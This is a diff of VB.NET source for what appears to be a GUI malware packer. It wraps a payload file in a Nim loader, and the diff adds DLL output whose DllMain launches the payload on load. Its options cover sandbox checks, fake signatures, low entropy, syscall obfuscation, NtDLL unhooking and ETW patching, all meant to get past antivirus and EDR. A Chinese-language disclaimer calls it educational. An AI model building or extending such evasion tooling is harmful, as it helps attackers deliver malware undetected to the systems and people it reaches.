@@ -1,4 +1,8 @@
-﻿Imports System.Reflection.Emit
+﻿Imports System.CodeDom.Compiler
+Imports System.Configuration
+Imports System.Reflection.Emit
+Imports System.Reflection.PortableExecutable
+Imports System.Security.Cryptography.Xml
 Imports System.Text.RegularExpressions
 Imports System.Threading
 Imports System.Windows
@@ -43,9 +47,21 @@ Public Class fMain
         cbSysCall.SelectedIndex = 0
         LogToTxtbox("[+] GUI ready")
 
+        ' Language
+        cbLanguage.Items.Add("EN")
+        cbLanguage.Items.Add("中文")
+        cbLanguage.Items.Add("RU")
+        cbLanguage.SelectedIndex = 0
+
     End Sub
 
     Private Sub btnGenerateBinary_Click(sender As Object, e As EventArgs) Handles btnGenerateBinary.Click
+
+        If cbLanguage.Items(cbLanguage.SelectedIndex) = "中文" Then
+            doChineese()
+            Return
+        End If
+
         txtOutputLog.ForeColor = Color.Lime
         LogToTxtbox("[+] Generating packed binary ...")
         ' create temp file
@@ -218,18 +234,55 @@ Public Class fMain
         ' ########## Compile ##########
         LogToTxtbox("[+] Compile")
         LogToTxtbox("  |-> Saving file")
-        ' Save temp file
-        If Not System.IO.File.Exists(tempFilePath) = True Then
-            Dim file As System.IO.FileStream
-            file = System.IO.File.Create(tempFilePath)
-            file.Close()
+
+
+        Dim compileCmd As String = ""
+        If cbAsDll.Checked Then
+            ' Compile as Dll
+            ' Fillin in dll functionality w. DllMain
+            tempFileContents = tempFileContents.Replace("
+when isMainModule
+    discard main(NULL) ", "
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain() # You must manually import and start Nim's garbage collector if you define you're own DllMain
+  case fdwReason:
+    of DLL_PROCESS_ATTACH:
+      var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+      CloseHandle(threadHandle)
+    of DLL_THREAD_ATTACH:
+      discard
+    of DLL_THREAD_DETACH:
+      discard
+    of DLL_PROCESS_DETACH:
+      discard
+    else:
+      discard
+
+  return true")
+            ' Save temp file
+            If Not System.IO.File.Exists(tempFilePath) = True Then
+                Dim file As System.IO.FileStream
+                file = System.IO.File.Create(tempFilePath)
+                file.Close()
+            End If
+            My.Computer.FileSystem.WriteAllText(tempFilePath, tempFileContents, False)
+            LogToTxtbox("  |-> Compiling")
+            outFile = outFile.Replace(".exe", ".dll")
+            compileCmd = "c -d:release --app:lib --noMain --gc:orc --out=..\..\..\" + outFile + " " + tempFilePath
+        Else
+            ' Compile as .exe
+            ' Save temp file
+            If Not System.IO.File.Exists(tempFilePath) = True Then
+                Dim file As System.IO.FileStream
+                file = System.IO.File.Create(tempFilePath)
+                file.Close()
+            End If
+            My.Computer.FileSystem.WriteAllText(tempFilePath, tempFileContents, False)
+            LogToTxtbox("  |-> Compiling")
+            compileCmd = "c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out=..\..\..\" + outFile + " " + tempFilePath
         End If
-        My.Computer.FileSystem.WriteAllText(tempFilePath, tempFileContents, False)
-        LogToTxtbox("  |-> Compiling")
-        ' Compile
-        Dim compileCmd As String = "c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out=..\..\..\" + outFile + " " + tempFilePath
         oProcess = New Process()
-        oStartInfo = New ProcessStartInfo("nim.exe", compileCmd)
+            oStartInfo = New ProcessStartInfo("nim.exe", compileCmd)
         oStartInfo.UseShellExecute = False
         oStartInfo.RedirectStandardOutput = True
         oProcess.StartInfo = oStartInfo
@@ -322,7 +375,7 @@ Public Class fMain
     End Sub
 
     Private Sub llGithubLink_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles llGithubLink.LinkClicked
-        Dim url As String = "https://github.com"
+        Dim url As String = "https://github.com/0xOvid/farsidePacker"
         Process.Start("C:\Windows\explorer.exe", url)
     End Sub
 
@@ -683,4 +736,57 @@ when isMainModule:
     Public Const sConstUserInput As String = "
 echo ""Press [Enter] to continue""; var randomStringToPreventOverlap = readLine(stdin);
 "
+
+    Private Sub cbLanguage_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbLanguage.SelectedIndexChanged
+        ' Change language of the app based on selection
+        If cbLanguage.Items(cbLanguage.SelectedIndex) = "中文" Then
+            setChineese()
+        End If
+
+    End Sub
+
+    Private Sub setChineese()
+        Me.BackColor = Color.FromKnownColor(KnownColor.DarkRed)
+        lIntro.Text = "该工具仅用于教育目的。作者对该内容可能引起的任何损害、未经授权的访问或非法活动不承担任何责任"
+        gbPayload.Text = "有效载荷"
+        lFileToBePacked.Text = "待打包文件"
+        btnBrowse.Text = "浏览"
+        btnRandomize.Text = "随机化"
+        lOutputFileName.Text = "输出文件名"
+        gbDebug.Text = "调试"
+        cbKeepTmpFile.Text = "保留tmp文件"
+        cbKeepPrintMessages.Text = "保留打印消息"
+        btnClearLog.Text = "清除日志"
+        gbOutputLog.Text = "输出日志"
+        gbExecution.Text = "执行"
+        lInjectionMethod.Text = "注射方式"
+        lBinaryFormat.Text = "二进制格式"
+        gbStatic.Text = "回避 - 静态"
+        cbLowEntropy.Text = "低熵"
+        cbFakeSignature.Text = "假签名"
+        gbSandbox.Text = "躲避 - 沙盒"
+        lDelayExecution.Text = "延迟执行"
+        lDelay.Text = "最短延迟（以秒为单位"
+        cbCheckRAM.Text = "检查内存"
+        cbCheckVM.Text = "检查虚拟机"
+        cbCheckUsername.Text = "检查用户名"
+        cbCheckSleep.Text = "检查睡眠情况"
+        gbEDR.Text = "规避-EDR"
+        lSyscallObf.Text = "系统调用混淆"
+        cbUnhookNtDll.Text = "取消挂接 NtDLL"
+        cbPatchETW.Text = "补丁ETW"
+        cbUserInput.Text = "等待用户输入"
+        btnGenerateBinary.Text = "=-----=[ 产生 ]=-----="
+    End Sub
+    Private Sub doChineese()
+        pbChineese.Visible = True
+        pbChineese.BringToFront()
+    End Sub
+    Private Sub setRussian()
+
+    End Sub
+    Private Sub doRussian()
+        pbRussian.Visible = True
+        pbRussian.BringToFront()
+    End Sub
 End Class
